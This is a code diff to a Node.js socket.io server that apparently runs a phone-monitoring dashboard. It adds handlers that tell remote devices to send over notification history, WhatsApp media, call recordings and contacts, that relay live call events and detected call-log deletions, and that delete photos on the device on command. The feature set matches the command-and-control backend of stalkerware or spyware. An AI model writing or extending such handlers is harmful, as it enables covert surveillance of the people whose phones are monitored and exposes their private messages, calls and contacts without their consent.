@@ -287,6 +287,110 @@ io.on('connection', (socket) => {
     });
   });
 
+  // Dashboard requests notifications history
+  socket.on('command:notifications:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:notifications:fetch');
+    }
+  });
+
+  // Device sends notifications data
+  socket.on('notifications:data', (data) => {
+    socket.broadcast.emit('notifications:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests WhatsApp media
+  socket.on('command:whatsapp:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:whatsapp:fetch');
+    }
+  });
+
+  // Device sends WhatsApp data
+  socket.on('whatsapp:data', (data) => {
+    socket.broadcast.emit('whatsapp:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests photo delete
+  socket.on('command:photo:delete', ({ deviceId, photoId, path }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:photo:delete', { photoId, path });
+    }
+  });
+
+  // Device confirms photo deleted
+  socket.on('photo:deleted', (data) => {
+    socket.broadcast.emit('photo:deleted', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests call recordings
+  socket.on('command:recordings:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:recordings:fetch');
+    }
+  });
+
+  // Device sends recordings list
+  socket.on('recordings:data', (data) => {
+    socket.broadcast.emit('recordings:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Device sends new recording in real-time
+  socket.on('recording:new', (data) => {
+    socket.broadcast.emit('recording:new', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests contacts
+  socket.on('command:contacts:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:contacts:fetch');
+    }
+  });
+
+  // Device sends contacts
+  socket.on('contacts:data', (data) => {
+    socket.broadcast.emit('contacts:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Live call events (real-time incoming/outgoing/missed)
+  socket.on('call:live', (data) => {
+    socket.broadcast.emit('call:live', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Call log deletion detected
+  socket.on('calllog:deleted', (data) => {
+    socket.broadcast.emit('calllog:deleted', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
   // Emergency commands
   socket.on('command:emergency:alarm', ({ deviceId }) => {
     const targetSocketId = deviceSockets.get(deviceId);
